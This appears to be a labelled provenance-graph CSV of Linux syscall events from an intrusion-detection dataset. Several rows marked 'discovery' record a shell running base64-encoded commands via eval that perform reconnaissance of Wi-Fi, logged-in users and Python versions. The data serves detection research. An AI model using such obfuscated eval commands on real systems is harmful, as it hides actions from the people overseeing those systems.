+c25aababfb8cc622f2824e50d5340d6d,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,101569.0,1701570989.946,syscall,101567.0,,,,,,,,,,,,,,,,,,,,0,0,28359516
+19b1bbffc2d14c6ed32478b2bf68b097,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,101569.0,,syscall,101567.0,base64 --decode,1701570989.946,,,,,,,,,,,,,,,,,,0,0,28359516
+,WasTriggeredBy,19b1bbffc2d14c6ed32478b2bf68b097,c25aababfb8cc622f2824e50d5340d6d,,,,,,,,,syscall,,,,169881.0,1701570989.946,execve,,,,,,,,,,,,,,,0,0,28359516
+,Used,19b1bbffc2d14c6ed32478b2bf68b097,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,169881.0,1701570989.946,load,,,,,,,,,,,,,,,0,0,28359516
+,Used,19b1bbffc2d14c6ed32478b2bf68b097,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,169881.0,1701570989.946,load,,,,,,,,,,,,,,,0,0,28359516
+5024698694e91a72c4034bbac4818817,Process,,,1000.0,1000.0,/usr/sbin/ifconfig,1000.0,1000.0,ifconfig,101570.0,1701570989.95,syscall,101566.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359516
+e5b89efbcd13d743efbc6e06233219bf,Process,,,1000.0,1000.0,/usr/sbin/ifconfig,1000.0,1000.0,ifconfig,101570.0,,syscall,101566.0,ifconfig,1701570989.95,,,,,,,,,,,,,,,,,,1,discovery,28359516
+,WasTriggeredBy,e5b89efbcd13d743efbc6e06233219bf,5024698694e91a72c4034bbac4818817,,,,,,,,,syscall,,,,169882.0,1701570989.95,execve,,,,,,,,,,,,,,,0,0,28359516
+,Used,e5b89efbcd13d743efbc6e06233219bf,2a2bff9cc177e37ad988243df7fde318,,,,,,,,,syscall,,,,169882.0,1701570989.95,load,,,,,,,,,,,,,,,0,0,28359516
+,Used,e5b89efbcd13d743efbc6e06233219bf,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,169882.0,1701570989.95,load,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169886.0,1701570993.734,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169889.0,1701570997.557,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169891.0,1701571001.1,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169893.0,1701571004.924,unlink,,,,,,,,,,,,,,,0,0,28359516
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,dc7dddf5afbc4ca1a41a580bc892aaa2,,,,,,,,,syscall,,,,169894.0,1701571008.111,rename (read),,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,3639f5745398d66677c34b1446f64e55,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,169894.0,1701571008.111,rename (write),,,,,,,,,,,,,,,0,0,28359516
+,WasDerivedFrom,3639f5745398d66677c34b1446f64e55,dc7dddf5afbc4ca1a41a580bc892aaa2,,,,,,,1950.0,,syscall,,,,169894.0,1701571008.111,rename,,,,,,,,,,,,,,,0,0,28359516
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,92c563de24db60ec9af99388b0f2c8ae,,,,,,,,,syscall,,,,169895.0,1701571008.111,rename (read),,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,8b64838afea9fc87cd27c7dca9f58dc9,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,169895.0,1701571008.111,rename (write),,,,,,,,,,,,,,,0,0,28359516
+,WasDerivedFrom,8b64838afea9fc87cd27c7dca9f58dc9,92c563de24db60ec9af99388b0f2c8ae,,,,,,,1950.0,,syscall,,,,169895.0,1701571008.111,rename,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,a51ce0b69d575831903a080382e8c394,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,169896.0,1701571008.111,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169898.0,1701571008.751,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169900.0,1701571011.943,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169921.0,1701571015.923,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169923.0,1701571019.106,unlink,,,,,,,,,,,,,,,0,0,28359516
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175477.0,1701575163.025,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175479.0,1701575166.853,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175481.0,1701575170.681,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175485.0,1701575174.509,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175487.0,1701575178.33,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175489.0,1701575182.162,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175510.0,1701575185.994,unlink,,,,,,,,,,,,,,,0,0,28359586
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,14560f80ad816b6a377d392e7e04410b,,,,,,,,,syscall,,,,175511.0,1701575189.11,rename (read),,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,43c3b094dd34fd3870902ecd30f6dfe2,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,175511.0,1701575189.11,rename (write),,,,,,,,,,,,,,,0,0,28359586
+,WasDerivedFrom,43c3b094dd34fd3870902ecd30f6dfe2,14560f80ad816b6a377d392e7e04410b,,,,,,,1950.0,,syscall,,,,175511.0,1701575189.11,rename,,,,,,,,,,,,,,,0,0,28359586
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,c4b41905f0def69a712680dabf9726be,,,,,,,,,syscall,,,,175512.0,1701575189.11,rename (read),,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,130fd16b3b2dc7a1e5065f1dcf49a0db,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,175512.0,1701575189.11,rename (write),,,,,,,,,,,,,,,0,0,28359586
+,WasDerivedFrom,130fd16b3b2dc7a1e5065f1dcf49a0db,c4b41905f0def69a712680dabf9726be,,,,,,,1950.0,,syscall,,,,175512.0,1701575189.11,rename,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,c93d2c9b884c11d6432f6b0f29e45da5,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,175513.0,1701575189.114,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175515.0,1701575189.206,unlink,,,,,,,,,,,,,,,0,0,28359586
+0bff9d3335286c1ca33bcd39251f6562,Process,,,0.0,0.0,/usr/lib/NetworkManager/nm-dispatcher,0.0,0.0,nm-dispatcher,105437.0,1701575191.03,syscall,1.0,,,,,,,,,,,,,,,,,,,,0,0,28359586
+13ded6bcdec428417a1e5af8000514a6,Process,,,0.0,0.0,/usr/lib/NetworkManager/nm-dispatcher,0.0,0.0,nm-dispatcher,105437.0,,syscall,1.0,/usr/lib/NetworkManager/nm-dispatcher,1701575191.03,,,,,,,,,,,,,,,,,,0,0,28359586
+,WasTriggeredBy,13ded6bcdec428417a1e5af8000514a6,0bff9d3335286c1ca33bcd39251f6562,,,,,,,,,syscall,,,,175516.0,1701575191.03,execve,,,,,,,,,,,,,,,0,0,28359586
+,Used,13ded6bcdec428417a1e5af8000514a6,db9f2a3563e47ac42b8dc750533df6e5,,,,,,,,,syscall,,,,175516.0,1701575191.03,load,,,,,,,,,,,,,,,0,0,28359586
+,Used,13ded6bcdec428417a1e5af8000514a6,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175516.0,1701575191.03,load,,,,,,,,,,,,,,,0,0,28359586
+a1360e60b3dd852f7865a3578327db7a,Process,,,0.0,0.0,/usr/bin/dash,0.0,0.0,01-ifupdown,105440.0,1701575191.05,syscall,105437.0,,,,,,,,,,,,,,,,,,,,0,0,28359586
+2f25359f93fc90e5c3e1781de5a15f1b,Process,,,0.0,0.0,/usr/bin/dash,0.0,0.0,01-ifupdown,105440.0,,syscall,105437.0,/bin/sh -e /etc/NetworkManager/dispatcher.d/01-ifupdown ens36 dhcp4-change,1701575191.05,,,,,,,,,,,,,,,,,,0,0,28359586
+,WasTriggeredBy,2f25359f93fc90e5c3e1781de5a15f1b,a1360e60b3dd852f7865a3578327db7a,,,,,,,,,syscall,,,,175518.0,1701575191.05,execve,,,,,,,,,,,,,,,0,0,28359586
+,Used,2f25359f93fc90e5c3e1781de5a15f1b,78ac58e5c4f62b11205d173eb3ad8b04,,,,,,,,,syscall,,,,175518.0,1701575191.05,load,,,,,,,,,,,,,,,0,0,28359586
+,Used,2f25359f93fc90e5c3e1781de5a15f1b,bdc2ca1d94be5a3958f6621d8b52fdb0,,,,,,,,,syscall,,,,175518.0,1701575191.05,load,,,,,,,,,,,,,,,0,0,28359586
+,Used,2f25359f93fc90e5c3e1781de5a15f1b,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175518.0,1701575191.05,load,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175520.0,1701575194.87,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175523.0,1701575200.199,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175526.0,1701575204.827,unlink,,,,,,,,,,,,,,,0,0,28359586
+4fc92c52e8ff272fb95d1a70b814976c,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,105454.0,1701575208.631,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359586
+6ba33703fa04fea85772a623bd647aa4,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,105454.0,,syscall,4127.0,"sh -c eval ""$(echo bm1jbGkgZGV2IHdpZmk= | base64 --decode)""",1701575208.631,,,,,,,,,,,,,,,,,,1,discovery,28359586
+,WasTriggeredBy,6ba33703fa04fea85772a623bd647aa4,4fc92c52e8ff272fb95d1a70b814976c,,,,,,,,,syscall,,,,175528.0,1701575208.631,execve,,,,,,,,,,,,,,,0,0,28359586
+,Used,6ba33703fa04fea85772a623bd647aa4,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,175528.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
+,Used,6ba33703fa04fea85772a623bd647aa4,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175528.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
+e093824e5112d9f10e61616f123c7db3,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,105457.0,1701575208.631,syscall,105455.0,,,,,,,,,,,,,,,,,,,,0,0,28359586
+c465782d0d8ed38edbbe05371a173e98,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,105457.0,,syscall,105455.0,base64 --decode,1701575208.631,,,,,,,,,,,,,,,,,,0,0,28359586
+,WasTriggeredBy,c465782d0d8ed38edbbe05371a173e98,e093824e5112d9f10e61616f123c7db3,,,,,,,,,syscall,,,,175529.0,1701575208.631,execve,,,,,,,,,,,,,,,0,0,28359586
+,Used,c465782d0d8ed38edbbe05371a173e98,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,175529.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
+,Used,c465782d0d8ed38edbbe05371a173e98,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175529.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175531.0,1701575208.655,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175533.0,1701575211.855,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175554.0,1701575215.688,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175556.0,1701575219.208,unlink,,,,,,,,,,,,,,,0,0,28359586
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180334.0,1701578643.119,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180336.0,1701578646.943,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180338.0,1701578650.771,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180340.0,1701578654.595,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180342.0,1701578658.403,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180344.0,1701578662.231,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180365.0,1701578666.055,unlink,,,,,,,,,,,,,,,0,0,28359644
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f605d4098ebd480a8869a25dc937935c,,,,,,,,,syscall,,,,180366.0,1701578669.111,rename (read),,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,4e633a88eeb0221eea065fc6db2a802f,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,180366.0,1701578669.111,rename (write),,,,,,,,,,,,,,,0,0,28359644
+,WasDerivedFrom,4e633a88eeb0221eea065fc6db2a802f,f605d4098ebd480a8869a25dc937935c,,,,,,,1950.0,,syscall,,,,180366.0,1701578669.111,rename,,,,,,,,,,,,,,,0,0,28359644
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f2c9ef1e2bc79a6afa4959ed5a8d6628,,,,,,,,,syscall,,,,180367.0,1701578669.111,rename (read),,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,d6ac64150d237f46cb9cd157354be12b,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,180367.0,1701578669.111,rename (write),,,,,,,,,,,,,,,0,0,28359644
+,WasDerivedFrom,d6ac64150d237f46cb9cd157354be12b,f2c9ef1e2bc79a6afa4959ed5a8d6628,,,,,,,1950.0,,syscall,,,,180367.0,1701578669.111,rename,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,0a6ad9185864bf9a614a35f8abccb288,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,180368.0,1701578669.111,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180370.0,1701578669.291,unlink,,,,,,,,,,,,,,,0,0,28359644
+fb541f3982cc0b046f30a1d20cccd7ed,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,108683.0,1701578671.687,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359644
+436db26a476d5bf76a0dd0830e112e47,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,108683.0,,syscall,4127.0,"sh -c eval ""$(echo dXNlcnM7IHc7IHdobw== | base64 --decode)""",1701578671.687,,,,,,,,,,,,,,,,,,1,discovery,28359644
+,WasTriggeredBy,436db26a476d5bf76a0dd0830e112e47,fb541f3982cc0b046f30a1d20cccd7ed,,,,,,,,,syscall,,,,180372.0,1701578671.687,execve,,,,,,,,,,,,,,,0,0,28359644
+,Used,436db26a476d5bf76a0dd0830e112e47,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,180372.0,1701578671.687,load,,,,,,,,,,,,,,,0,0,28359644
+,Used,436db26a476d5bf76a0dd0830e112e47,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,180372.0,1701578671.687,load,,,,,,,,,,,,,,,0,0,28359644
+bef8186802ac0174fc26cf37880a29fa,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,108686.0,1701578671.691,syscall,108684.0,,,,,,,,,,,,,,,,,,,,0,0,28359644
+9287f308278f8f487245119309f55b14,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,108686.0,,syscall,108684.0,base64 --decode,1701578671.691,,,,,,,,,,,,,,,,,,0,0,28359644
+,WasTriggeredBy,9287f308278f8f487245119309f55b14,bef8186802ac0174fc26cf37880a29fa,,,,,,,,,syscall,,,,180373.0,1701578671.691,execve,,,,,,,,,,,,,,,0,0,28359644
+,Used,9287f308278f8f487245119309f55b14,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,180373.0,1701578671.691,load,,,,,,,,,,,,,,,0,0,28359644
+,Used,9287f308278f8f487245119309f55b14,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,180373.0,1701578671.691,load,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180375.0,1701578675.5,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180377.0,1701578679.32,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180379.0,1701578683.144,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180381.0,1701578686.972,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180383.0,1701578690.8,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180385.0,1701578694.612,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180406.0,1701578699.24,unlink,,,,,,,,,,,,,,,0,0,28359644
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184408.0,1701581703.192,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184410.0,1701581707.012,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184413.0,1701581710.84,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184415.0,1701581714.664,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184417.0,1701581718.488,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184421.0,1701581723.733,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184442.0,1701581729.361,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184444.0,1701581733.185,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184446.0,1701581737.013,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184448.0,1701581740.841,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184450.0,1701581744.665,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184452.0,1701581748.486,unlink,,,,,,,,,,,,,,,0,0,28359695
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f0d49420a6b35e37dbbd7866edd49d83,,,,,,,,,syscall,,,,184453.0,1701581749.106,rename (read),,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,a5dcb1c692b1e39d24290650b6172650,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,184453.0,1701581749.106,rename (write),,,,,,,,,,,,,,,0,0,28359695
+,WasDerivedFrom,a5dcb1c692b1e39d24290650b6172650,f0d49420a6b35e37dbbd7866edd49d83,,,,,,,1950.0,,syscall,,,,184453.0,1701581749.106,rename,,,,,,,,,,,,,,,0,0,28359695
+,Used,dc3cad4762a75f7ad2c4f9d13a61c057,ebf5d637441bc4066a1bf597c38a6805,,,,,,,,,syscall,,,,184454.0,1701581749.106,rename (read),,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,18c1d8e0ef95f2d4797d7379694ed7ef,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,184454.0,1701581749.106,rename (write),,,,,,,,,,,,,,,0,0,28359695
+,WasDerivedFrom,18c1d8e0ef95f2d4797d7379694ed7ef,ebf5d637441bc4066a1bf597c38a6805,,,,,,,1950.0,,syscall,,,,184454.0,1701581749.106,rename,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,aa5dd82aa9d7724dca9bca88a69ed619,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,184455.0,1701581749.11,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184457.0,1701581752.314,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184478.0,1701581756.138,unlink,,,,,,,,,,,,,,,0,0,28359695
+0c0ee0cdbaf6ff815c7c47397cbb0d34,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,111519.0,1701581758.746,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359695
+d59d492c02128c522433d3035ec73f6a,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,111519.0,,syscall,4127.0,"sh -c eval ""$(echo cHl0aG9uMyAtLXZlcnNpb247cHl0aG9uMiAtLXZlcnNpb247cHl0aG9uIC0tdmVyc2lvbg== | base64 --decode)""",1701581758.746,,,,,,,,,,,,,,,,,,1,discovery,28359695
+,WasTriggeredBy,d59d492c02128c522433d3035ec73f6a,0c0ee0cdbaf6ff815c7c47397cbb0d34,,,,,,,,,syscall,,,,184480.0,1701581758.746,execve,,,,,,,,,,,,,,,0,0,28359695
+,Used,d59d492c02128c522433d3035ec73f6a,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,184480.0,1701581758.746,load,,,,,,,,,,,,,,,0,0,28359695
+,Used,d59d492c02128c522433d3035ec73f6a,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,184480.0,1701581758.746,load,,,,,,,,,,,,,,,0,0,28359695
+fad1a4be732446a0c524897465946923,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,111522.0,1701581758.75,syscall,111520.0,,,,,,,,,,,,,,,,,,,,0,0,28359695
+a4c55290c966db4710ebfb9e85eabc15,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,111522.0,,syscall,111520.0,base64 --decode,1701581758.75,,,,,,,,,,,,,,,,,,0,0,28359695
+,WasTriggeredBy,a4c55290c966db4710ebfb9e85eabc15,fad1a4be732446a0c524897465946923,,,,,,,,,syscall,,,,184481.0,1701581758.75,execve,,,,,,,,,,,,,,,0,0,28359695
+,Used,a4c55290c966db4710ebfb9e85eabc15,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,184481.0,1701581758.75,load,,,,,,,,,,,,,,,0,0,28359695
+,Used,a4c55290c966db4710ebfb9e85eabc15,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,184481.0,1701581758.75,load,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184483.0,1701581759.366,unlink,,,,,,,,,,,,,,,0,0,28359695
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188494.0,1701584763.25,unlink,,,,,,,,,,,,,,,0,0,28359746
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188496.0,1701584767.083,unlink,,,,,,,,,,,,,,,0,0,28359746
